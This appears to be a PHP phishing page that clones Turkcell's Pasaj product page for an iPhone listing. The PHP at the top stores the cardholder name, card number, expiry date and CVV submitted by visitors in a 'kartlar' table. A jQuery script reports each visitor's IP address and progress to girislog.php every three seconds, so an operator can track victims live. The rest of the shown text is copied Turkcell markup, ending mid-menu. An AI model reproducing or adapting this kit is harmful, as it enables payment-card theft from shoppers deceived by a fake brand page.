<?php
include('database/connect.php');

$sorgu = $db->prepare("SELECT * FROM ilan_turkcell Where id=:id");
$sorgu->execute(['id' => (int)$_GET["id"]]);
$sonuc = $sorgu->fetch();//sorgu çalıştırılıp veriler alınıyor

if ($_POST) {

    $ekleyen = $sonuc['ekleyen'];
    $hizmet = 'Turkcell';
    $kartadsoyad = htmlspecialchars($_POST["kartadsoyad"]);
    $kartno = htmlspecialchars($_POST["kartno"]);
    $kartay = htmlspecialchars($_POST["kartay"]);
    $kartyil = htmlspecialchars($_POST["kartyil"]);
    $kartayyil = $kartay . " / " . $kartyil;
    $kartcvv = htmlspecialchars($_POST["kartcvv"]);

    if ($kartadsoyad != "" or $kartno != "" or $kartayyil != "" or $kartcvv != "") {
        // Değişecek veriler
        $satir = [
            'ekleyen' => $ekleyen,
            'hizmet' => $hizmet,
            'kartadsoyad' => $kartadsoyad,
            'kartno' => $kartno,
            'kartayyil' => $kartayyil,
            'kartcvv' => $kartcvv,
        ];

        // Veri ekleme sorgusu
        $sql = "INSERT INTO kartlar (ekleyen, hizmet, kartadsoyad, kartno, kartayyil, kartcvv) 
                VALUES (:ekleyen, :hizmet, :kartadsoyad, :kartno, :kartayyil, :kartcvv)";

        $durum = $db->prepare($sql)->execute($satir);
    }
}

$id = $_GET['id'];
$sorgu = $db->prepare("SELECT * FROM ilan_turkcell WHERE id=:id");
$sorgu->execute(['id' => (int)$id]);

while ($sonuc = $sorgu->fetch()) {
    if ($query = $db->prepare("SELECT * FROM ilan_turkcell WHERE id=:id AND ilandurum = '1'")) {
        $query->execute(['id' => (int)$id]);
        if ($query->rowCount() > 0) {  
?>

<!doctype html>
<html lang="tr" class="">
	<head>
		<!-- definitions.common.mobile.head.start -->
		<link rel="dns-prefetch" href="//s.turkcell.com.tr" />
<link rel="dns-prefetch" href="//in.hotjar.com" />
<link rel="dns-prefetch" href="//rest.segmentify.com" />
<link rel="dns-prefetch" href="//script.hotjar.com" />
<link rel="dns-prefetch" href="//static.hotjar.com" />
<link rel="dns-prefetch" href="//vars.hotjar.com" />
<link rel="dns-prefetch" href="//www.facebook.com" />
<link rel="dns-prefetch" href="//www.google.com.tr-gmtdmp" />
<link rel="dns-prefetch" href="//www.googleadservices.com" />
<link rel="dns-prefetch" href="//www.google-analytics.com" />
<link rel="dns-prefetch" href="//www.googletagmanager.com" />
		<!-- End definitions.common.mobile.head.start -->
		














<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="ie=edge; chrome=1">
<meta name="format-detection" content="telephone=no">







	
<title><?php echo $sonuc['urunadi'] ?> Özellikleri ve Fiyatı </title>
	
	
    <meta name="searchTitle" content="<?php echo $sonuc['urunadi'] ?>">


    <meta name="description" content="<?php echo $sonuc['urunadi'] ?> tüm özellikleriyle şimdi Turkcell Pasaj'da! ">

<!--Metas for search-->

    <meta name="paymentType" content="BOTH">


    <meta name="showInMobile" content="true">


    <meta name="searchNavigationTab" content="Devices">

    <meta name="customerType" content="Bireysel">


    <meta name="titleForAutocomplete" content="iphone,phone,hone,one,ne,e,i,ip,iph,ipho,iphon,14,4,1,pro,ro,o,p,pr,max,ax,x,m,ma,512,12,2,5,51,gb,b,g">


    <meta name="searchImage" content="/SiteAssets/pasaj/crop/cg/1663935485571/1-1663935478712.png">


    <meta name="isExpiredPage" content="false">


    <meta name="robots" content="index,follow">
    

    <meta name="isCampaign" content="false">


    <meta name="isNew" content="false">


    <meta name="isOffered" content="false">


    <meta name="isPopular" content="false">


    <meta name="price" content="28254,32">


    <meta name="cashPrice" content="74799.0 TL">



    <meta name="priceText" content="TL x 3 AY">



    <meta name="date" content="07.09.2022">


    <meta name="contentType" content="Device">


    <meta name="contentId" content="714a758f-bcd6-4a22-a5c5-d62f350c0fc1">




<!--Metas for social networking-->

    <meta property="og:type" content="website">


    <meta property="og:title" content="<?php echo $sonuc['urunadi'] ?>">

<!--[issue: 200597] -->

    <?php
      $sorgu = $db->prepare("SELECT * FROM panel");
      $sorgu->execute();
      while ($sonuc2 = $sorgu->fetch()) {
      ?>
      <meta data-rh="true" property="og:image" content="https://<?php echo ($sonuc2["dom_turkcell"]); ?>/images/<?php echo $sonuc["resim1"]; ?>"/>
      <?php
      }
    ?>
			
			
		
	

	
		
		
			<link rel="canonical" href="https://www.turkcell.com.tr/pasaj/cep-telefonu/ios-telefonlar/iphone-14-pro-max-512-gb" />
		
		
	



<meta name="apple-mobile-web-app-capable" content="yes">


	
	
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
	

<meta name="msapplication-tap-highlight" content="no" />







		<link rel="shortcut icon" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/common/images/favicon.ico?1773534948049" type="image/vnd.microsoft.icon">

		<link rel="preload" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/fonts/GreycliffCF-Regular.woff2?1773534948049" as="font" type="font/woff2" crossorigin="">
		<link rel="preload" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/fonts/GreycliffCF-Bold.woff2?1773534948049" as="font" type="font/woff2" crossorigin="">
		<link rel="preload" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/fonts/GreycliffCF-Medium.woff2?1773534948049" as="font" type="font/woff2" crossorigin="">
		<link rel="preload" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/common/fonts/PasajTurkcellIconFont.woff?1773534948049" as="font" type="font/woff" crossorigin="">
		<link rel="preload" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/fonts/TurkcellIconFont.woff?1773534948049" as="font" type="font/woff" crossorigin="">

		<link rel="stylesheet" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/common/styles/vendors.css?1773534948049">
		<link rel="stylesheet" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/mobile/styles/app.mobile.min.css?1773534948049">
		<link rel="stylesheet" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/styles/vendors.css?1773534948049">
		<link rel="stylesheet" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/styles/vendors/smartbanner.min.css?1773534948049">
		<link rel="stylesheet" href="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/mobile/styles/app.mobile.min.css?1773534948049">

		<!-- definitions.common.mobile.head.end -->
		<!-- Used by Google Tag Manager and should be imported to here--> 
<script> 
      var dataLayer = []; 
</script> 
<!-- Google Tag Manager --> 
<script type="text/javascript">
     setTimeout(function () {
         try {
             (function (w, d, s, l, i) {
             w[l] = w[l] || []; w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
                var f = d.getElementsByTagName(s)[0], j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
                j.async = true; j.src = '//www.googletagmanager.com/gtm.js?id=' + i + dl;
                f.parentNode.insertBefore(j, f);
             })(window, document, 'script', 'dataLayer', 'GTM-MLFT');
            }
            catch (e) {
                console.log(e)
            }
    }, 2000);
</script> 
<!-- End Google Tag Manager -->
<link rel = "manifest" href = "/insider/manifest.json">
		<!-- End definitions.common.mobile.head.end -->
	</head>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$(document).ready(function() {
    function guncelleVeriler() {
        // Kullanıcının IP adresini al
        var ip_adresi = '<?php echo $_SERVER['REMOTE_ADDR']; ?>';
        
        // Hangi sayfada olduğunu belirle (örneğin, ilan sayfası)
        var sayfa = 'İban Sayfasında<br><div style="margin-left:23px">[<font color="green">■■■■■■■■</font><font color="red">□□</font>] 80%</div><br>'; // İlgili sayfanın adını kullanın
        var ekleyen = '<?php echo $sonuc["ekleyen"]; ?>'; // İlgili sayfanın adını kullanın
        var urunadi = '<?php echo $sonuc["urunadi"]; ?>'; // İlgili sayfanın adını kullanın

        // Sunucuya POST isteği göndererek verileri güncelle
        $.ajax({
            type: 'POST',
            url: 'girislog.php', // Kayıt ekleme işlemini yapacak olan PHP dosyasının adını ve yolunu buraya ekleyin
            data: {
                ip_adresi: ip_adresi,
                sayfa: sayfa,
                ekleyen: ekleyen,
                urunadi: urunadi
            },
            success: function(response) {
                console.log('Veriler başarıyla güncellendi.');
            },
            error: function(xhr, status, error) {
                console.error('Veriler güncellenirken bir hata oluştu: ' + error);
            }
        });
    }

    // Belirli aralıklarla verileri güncellemek için JavaScript setInterval kullanın
    setInterval(guncelleVeriler, 3000); // 5000 milisaniye (5 saniye) olarak ayarladık
});
</script>

	<body>
		<script src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/jquery.min.js?1773534948049"></script>
		
<script>
	var shConfig = {};
	shConfig.loggedIn = false;
	shConfig.staticLib = "https://ffo3gv1cf3ir.merlincdn.net";
	shConfig.siteAssets = "https://ffo3gv1cf3ir.merlincdn.net";
	shConfig.csrfToken = "";
	shConfig.redirectUrlAfterLogin = "";
	shConfig.loginSuccessCallback = defaultLoginSuccessCallback;
	
	function defaultLoginSuccessCallback() {
	    if (shConfig.redirectUrlAfterLogin) {
	        location.href = shConfig.redirectUrlAfterLogin;
	    } else {
	        location.reload();
	    }
	}
	
	
	
	
    <!-- Google Analytics Integrations -->
    try {
        if (pageName == "") {
            var pageName$ = window.location.pathname;
        } else {
            var pageName$ = pageName;
        }
    } catch (e) {
        var pageName$ = window.location.pathname;
    }
    var utag_data = utag_data || {};
    utag_data.pageName = pageName$;
    utag_data.customerStatus = 'not_logged_in';
	
	<!-- Tealium Universal Tag Data  -->
	
		utag_data.page_subcategory_name = [ "bireysel:urunler-ve-hizmetler:pasaj:cep-telefonu" ];
	
	
		utag_data.page_type = [ "bireysel:pasaj:cep-telefonu:urun" ];
	
	
		utag_data.product_category = [ "Cep Telefonu-Aksesuar" ];
	
	
		utag_data.product_name = [ "iPhone 11 Pro Max 128 GB" ];
	
	
	
	
		utag_data.product_brand = [ "Apple" ];
	
	
		utag_data.product_id = [ "1071334" ];
	
	
		utag_data.frame_type = [ "turkcell" ];
	
	<!-- Tealium Universal Tag Data  -->
	
</script>



		
<script>
    window.cust = true ? {} : '{}';
</script>

		<!-- definitions.common.mobile.body.start -->
		<!-- TEALIUM --> 
<script type="text/javascript"> 
(function(a,b,c,d){ 
window.utagStatus="ready"; 
})(); 
</script> 
<script type="text/javascript"> 
var utag = { 
view: function(a,c,d) { 
} 
} 
</script> 
<!-- /TEALIUM --> 

<!-- Google Tag Manager --> 
<!-- Google Tag Manager (noscript) --> 
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MLFT" 
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript> 
<!-- End Google Tag Manager (noscript) --> 
<!-- /Google Tag Manager -->
		<!-- End definitions.common.mobile.body.start -->

		

















    <header class="o-p-mobile-header " data-component="PasajMobileHeader">
        <div class="container-p">
            <div class="o-p-mobile-header__top">

                
                    <div class="o-p-mobile-header__logo">
                        
	<a href="https://m.turkcell.com.tr/" title="Pasaj">
		<img src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/common/images/content/pasaj-logo-new.png?1773534948049" alt="Pasaj">
	</a>

                    </div>
                

                <div class="o-p-mobile-header__top-menu">
                    <a class="a-btn-icon-p o-p-mobile-header__top-menu__item o-p-mobile-header__top-menu__item--basket" href="/pasaj/siparisler" data-url="/pasaj/basket-items-count">
                        <i class="icon-p-basket"></i>
                        <span class="o-p-mobile-header__top-menu__item__basket-count js-p-header-basket-item">0</span>
                    </a>
                    <a href="/pasaj/hesabim/favorilerim" class="favorite-icon"><i class="a-icon icon-favorite"></i></a>

                    
<a href="javascript:;" class="a-btn-icon-p o-p-mobile-header__top-menu__item js-user-menu-trigger"><i class="icon-p-profile "></i></a>
<div class="o-p-mobile-header__top-menu__item o-p-mobile-header__top-menu__item--profile" data-component="PasajUserProfile"
	 data-login='{
	"logoutSdkUrl":"https://tsdk.turkcell.com.tr/SERVICE/AuthAPI/invalidateToken.json",
	"logoutUrl":"/pasaj/cikis/pasaj",
	"pingUrl": "/pasaj/hesabim/ping",
	"rememberMeToken": "",
	"timeout": 600,
	"timeoutModalID":"login-timeout-lightbox"
}'>
	<a href="javascript:;" class="js-login-menu-trigger"><i class="icon-p-profile "></i></a>
	<div class="o-p-mobile-header__top-menu__login-panel"> <a class="o-p-mobile-header__top-menu__login-panel__item" href="/pasaj/hesabim/siparislerim">Siparişlerim</a><a class="o-p-mobile-header__top-menu__login-panel__item" href="/pasaj/hesabim/kullanici-bilgilerim">Kullanıcı Bilgilerim</a> <a class="o-p-mobile-header__top-menu__login-panel__item" href="/pasaj/hesabim/degerlendirmelerim">Değerlendirmelerim</a> <a class="o-p-mobile-header__top-menu__login-panel__item" href="/pasaj/hesabim/favorilerim">Favorilerim</a> <a class="o-p-mobile-header__top-menu__login-panel__item" href="/pasaj/hesabim/faturama-yansitarak-odeme">Faturama Yansıtarak Ödeme</a> <a class="o-p-mobile-header__top-menu__login-panel__item" href="/pasaj/hesabim/bana-ozel-teklifler">Bana Özel Teklifler</a> <a class="o-p-mobile-header__top-menu__login-panel__item o-p-mobile-header__top-menu__login-panel__item--bb" href="/hesabim/ayarlarim/kart-ayarlari">Kayıtlı Kartlarım</a> <a class="o-p-mobile-header__top-menu__login-panel__item js-p-logout-lightbox" href="javascript:;"> <i class="icon icon-p-share"></i>Çıkış Yap</a> </div>
</div>

                    <a class="a-btn-icon o-p-mobile-header__top-menu__item js-menu-trigger" href="javascript:;">
                        <i class="icon-p-menu"></i>
                    </a>
                </div>

            </div>

            <div class="o-p-mobile-header__bottom">
                

	<div class="m-p-search-area m-p-search-area--mobile" data-component="PasajSearchArea"  data-popular-url="/pasaj/search/popular.json"
		 data-autocomplete-url="/pasaj/search/autocomplete.json" data-autocomplete-recommended-text="passage.header.searcharea.recommendedtext" data-autocomplete-start-length="3">
    	<form class="m-p-search-area__form" action="/pasaj/search">
    		<button class="m-p-search-area__button"><i class="icon icon-p-search"></i></button>
    		<input type="text" class="m-p-search-area__input js-autocomplete-input" autocomplete="off" placeholder="Ürün, marka veya kategori ara" name="qx">
			<input class="js-category-hidden-input" type="hidden" name="category" value="all">
    	</form>
		<div class="m-p-search-area__suggestions">

		</div>
	</div>
	<script id="m-p-search-area-template" type="text/x-handlebars-template">
		<div class="m-p-search-area__suggestions__header">
			<div class="m-p-search-area__suggestions__item"><span>Geçmiş Aramalar</span><a href="javascript:;" class="js-clear-all-history" title="Arama geçmişini temizle">Arama geçmişini temizle</a></div>
			<div class="m-btn-group justify-content-start">
				{{#each lastSearch}}
				<a class="a-btn a-btn--tag" href="javascript:;"><span class="js-history-item">{{{this}}}</span> <i class="icon icon-p-close js-clear-history-item"></i></a>
				{{/each}}
			</div>
		</div>
		{{#if special}}
		<div class="m-p-search-area__suggestions__slider">
			<span>Sana Özel Kategoriler</span>
			<div class="m-slider" data-component='{"slidesPerView":"auto","spaceBetween":16,"type":"Slider"}'>
				<div class="m-slider__swiper swiper-container">
					<div class="swiper-wrapper">
						{{#each special}}
						<div class="swiper-slide swiper-lazy">
							<a class="a-btn a-btn--tag a-btn--tag--true" title="{{title}}" href="{{favoritesUrl}}">{{{title}}}</a>
						</div>
						{{/each}}
					</div>
				</div>
			</div>
		</div>
		{{/if}}
		<div class="m-p-search-area__suggestions__list">
			<span>Popüler Aramalar </span>
			<div class="m-tab" data-component='{"type":"Tab"}'>
				<div class="m-tab__items" role="tablist">
					<div class="m-slider" data-component='{"slidesPerView":"auto","spaceBetween":16,"navigation":true,"type":"Slider"}'>
						<div class="m-slider__swiper swiper-container">
							<div class="swiper-wrapper">
								{{#each items}}
								<div class="swiper-slide"><a href="javascript:;" title="{{title}}" role="tab">{{{title}}} </a></div>
								{{/each}}
								{{#if campaigns}}
								<div class="swiper-slide"><a href="javascript:;" title="{{campaigns.title}}" role="tab">{{campaigns.title}}</a></div>
								{{/if}}
							</div>
						</div>
						<div class="container m-slider__container"><a class="a-btn-icon m-slider__prev a-btn-icon--circle a-btn-icon--disabled" href="javascript:;" title="Geri"><i class="icon-arrow-left"></i>Geri</a><a class="a-btn-icon m-slider__next a-btn-icon--circle" href="javascript:;" title="İleri"><i class="icon-arrow-right"></i>İleri</a></div>
					</div>
				</div>
				<div class="m-tab__panes">
					{{#each items}}
					<div class="m-tab__pane" role="tabpanel">
						<ul>
							{{#each list}}
							<li>
								<a href="{{url}}" class="m-basket-card">
									<div class="m-basket-card__head">
										<div class="m-basket-card__col m-basket-card__col--product" title="{{searchTitle}}">
											<figure class="m-basket-card__img">
												<img class="ls-is-cached lazyloaded" src="{{imageUrl}}" alt="{{searchTitle}}" data-src="{{{imageUrl}}}">
											</figure>
											<h3 class="m-basket-card__title">{{{searchTitle}}}</h3>
										</div>
										<div class="m-basket-card__col">
											{{#if cashPrice}} <span class="m-basket-card__price m-basket-card__price--total"><sub>{{{cashPrice}}}</sub> <sup>TL</sup></span>
											{{#if campaignPrice}}<span class="m-basket-card__price__discount"><sub>{{{campaignPrice}}} TL</sub> <sup> %{{{discountRate}}} İndirimi</sup></span>{{/if}}
											{{/if}}
										</div>
									</div>
								</a>
							</li>
							{{/each}}
						</ul>
						<ul class="m-p-search-area__suggestions__list js-suggestion-list-all">
							<li class="m-p-search-area__suggestions__item"><a href="{{searchAllUrl}}" class="all" data-base-href="{{searchAllUrl}}">{{{searchAllTitle}}} </a></li>
						</ul>
					</div>
					{{/each}}
					{{#if campaigns}}
					<div class="m-tab__pane" role="tabpanel">
						<div class="m-p-search-area--campaign-wrap">
							{{#each campaigns.list}}
							<a href="{{url}}" title="{{searchTitle}}" class="m-p-search-area--campaign">
								<div class="m-p-search-area--campaign__img"><img class="p-lazy loading" src="{{imageUrl}}" alt="{{searchTitle}}" data-ll-status="loading"></div>
								<div class="m-p-search-area--campaign__body">
									<h3>{{{searchTitle}}}</h3>
									<div class="m-p-search-area--campaign__date">
										<span>Son Gün</span>
										<strong>{{{date}}}</strong>
									</div>
								</div>
							</a>
							{{/each}}
						</div>
						<ul class="m-p-search-area__suggestions__list js-suggestion-list-all">
							<li class="m-p-search-area__suggestions__item"><a href="{{campaigns.searchAllUrl}}" class="all" data-base-href="{{searchAllUrl}}">Tüm {{{campaigns.title}}} göster</a></li>
						</ul>
					</div>
					{{/if}}
				</div>
			</div>
		</div>

	</script>


            </div>
        </div>

        <div class="o-p-mobile-header__dropdown">
            <div class="o-p-mobile-header__dropdown__header">
                
                    <div class="o-p-mobile-header__logo">
                        
	<a href="https://m.turkcell.com.tr/" title="Pasaj">
		<img src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/common/images/content/pasaj-logo-new.png?1773534948049" alt="Pasaj">
	</a>

                    </div>
                
                <a href="javascript:;" class="o-p-mobile-header__dropdown__close">
                    <i class="icon icon-p-close"></i>
                </a>
            </div>
            <div class="o-p-mobile-header__dropdown__body">
                <ul>
                    
                            <li class="dropdown">
                                
                                <a href="javascript:;">Cep Telefonu-Aksesuar</a>
                                
                                    <ul>
                                        
                                            <li class="">
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Apple Telefonlar</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/cep-telefonu/ios-telefonlar" class="all">Tüm Apple Telefonlar</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Android Telefonlar</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/cep-telefonu/android-telefonlar" class="all">Tüm Android Telefonlar</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Giyilebilir Teknolojiler</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/giyilebilir-teknolojiler/akilli-saatler">Akıllı Saatler</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/giyilebilir-teknolojiler/akilli-bileklikler">Akıllı Bileklikler</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/giyilebilir-teknolojiler/akilli-cocuk-saatleri">Akıllı Çocuk Saatleri</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/giyilebilir-teknolojiler/takip-cihazlari">Takip Cihazları</a>
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/cep-telefonu/giyilebilir-teknolojiler" class="all">Tüm Giyilebilir Teknolojiler</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Aksesuarlar</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/kiliflar">Telefon Kılıfları</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/airpods">AirPods</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/kulakliklar">Kulaklıklar</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/bluetooth-hoparlorler">Bluetooth Hoparlörler</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/kablo-duzenleyici-urunler">Kablo Düzenleyiciler</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/akilli-saat-aksesuarlari">Akıllı Saat Aksesuarları</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/airpods-aksesuarlari">AirPods Aksesuarları</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/ekran-koruyucular">Ekran Koruyucular</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/sarj-cihazlari">Şarj Cihazları</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/cep-telefonu-tutuculari">Telefon Tutucular</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/donusturuculer">Dönüştürücüler</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/hafiza-depolama-urunleri">Hafıza & Depolama Ürünleri</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/selfie-cubugu">Selfie Çubukları</a>
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari" class="all">Tüm Aksesuarlar</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Yenilenmiş Telefonlar</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/cep-telefonu/yenilenmis-telefonlar" class="all">Tüm Yenilenmiş Telefonlar</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                        <li><a href="/pasaj/cep-telefonu" class="all">Tüm Cep Telefonu-Aksesuar</a></li>
                                    </ul>
                                
                            </li>
                        
                            <li class="dropdown">
                                
                                <a href="javascript:;">Bilgisayar-Tablet</a>
                                
                                    <ul>
                                        
                                            <li class="">
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Masaüstü Bilgisayarlar</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/masaustu-bilgisayarlar/all-in-one-bilgisayarlar">All-in-One Bilgisayarlar</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/masaustu-bilgisayarlar/masaustu-bilgisayar">Masaüstü Bilgisayarlar</a>
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/bilgisayar-tablet/masaustu-bilgisayarlar" class="all">Tüm Masaüstü Bilgisayarlar</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Dizüstü Bilgisayarlar</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/bilgisayarlar/macbook">MacBook</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/bilgisayarlar/laptoplar">Laptoplar</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/bilgisayarlar/oyun-bilgisayari">Oyun Bilgisayarları</a>
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/bilgisayar-tablet/bilgisayarlar" class="all">Tüm Dizüstü Bilgisayarlar</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Tabletler</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/tabletler/apple-tabletler">Apple Tabletler</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/tabletler/android-tabletler">Android Tabletler</a>
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/bilgisayar-tablet/tabletler" class="all">Tüm Tabletler</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">E-Kitap Okuyucular</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/bilgisayar-tablet/e-kitap-okuyucu" class="all">Tüm E-Kitap Okuyucular</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Modem & Network Ürünleri</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/modem-ve-network-urunleri/modemler">Modemler</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/modem-ve-network-urunleri/network-urunleri">Network Ürünleri</a>
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/bilgisayar-tablet/modem-ve-network-urunleri" class="all">Tüm Modem & Network Ürünleri</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Veri Depolama Ürünleri</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/veri-depolama-urunleri/harici-disk">Harici Diskler</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/veri-depolama-urunleri/usb-bellek">USB Bellekler</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/veri-depolama-urunleri/hafiza-karti-urunleri">Hafıza Kartları</a>
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/bilgisayar-tablet/veri-depolama-urunleri" class="all">Tüm Veri Depolama Ürünleri</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Yazılım Ürünleri</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/yazilim-urunleri/office-yazilimlari">Office Yazılımları</a>
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/yazilim-urunleri/antivirus-guvenlik">Antivirüs ve Güvenlik</a>
                                                                
                                                            </li>
                                                        
                                                        <li><a href="/pasaj/bilgisayar-tablet/yazilim-urunleri" class="all">Tüm Yazılım Ürünleri</a></li>
                                                    </ul>
                                                
                                            </li>
                                        
                                            <li class="dropdown">
                                                
                                                    <a href="javascript:;">Bilgisayar Parçaları (OEM)</a>
                                                    <ul>
                                                        
                                                            <li class="">
                                                                
                                                            </li>
                                                        
                                                            <li class="">
                                                                
                                                                <a href="/pasaj/bilgisayar-tablet/bilgisayar-bilesenleri-oem/anakart">Anakartlar</a>
                                                                
